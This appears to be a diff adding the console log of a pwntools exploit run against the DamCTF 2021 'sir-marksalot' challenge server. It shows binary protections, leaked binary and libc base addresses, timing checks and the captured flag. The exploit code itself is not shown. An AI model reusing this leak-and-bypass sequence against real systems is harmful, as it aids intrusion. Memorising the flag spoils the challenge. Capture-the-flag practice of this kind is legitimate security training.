@@ -1,0 +1,38 @@
+# ./exploit.py REMOTE=1
+[*] '/pwd/datajerk/damctf2021/sir-marksalot/sir-marksalot'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] '/pwd/datajerk/damctf2021/sir-marksalot/libc6_2.27-3ubuntu1.4_amd64.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] pass 1
+[*] rand 17,22
+[CRITICAL] rand mismatch
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 38,24
+[*] grue at 36,2
+[*] time check: 3.4693713188171387s
+[*] leak: 0x55cdfc1d1217
+[*] binary.address: 0x55cdfc1d0000
+[*] time check: 4.648568630218506s
+[*] time check: 12.33139157295227s
+[*] leak: 0x7fad54c72aa0
+[*] libc.address: 0x7fad54bf2000
+[*] pass 2
+[*] x,y = 29,31
+[*] rand 29,31
+[*] grue at 2,31
+[*] time check: 16.73600125312805s
+[*] time check: 18.195335865020752s
+[*] time check: 27.541880130767822s
+dam{1n73N710N4LLy_93771n9_3473n_8y_4_9rU3-7H47_w42_9Ru3S0M3}
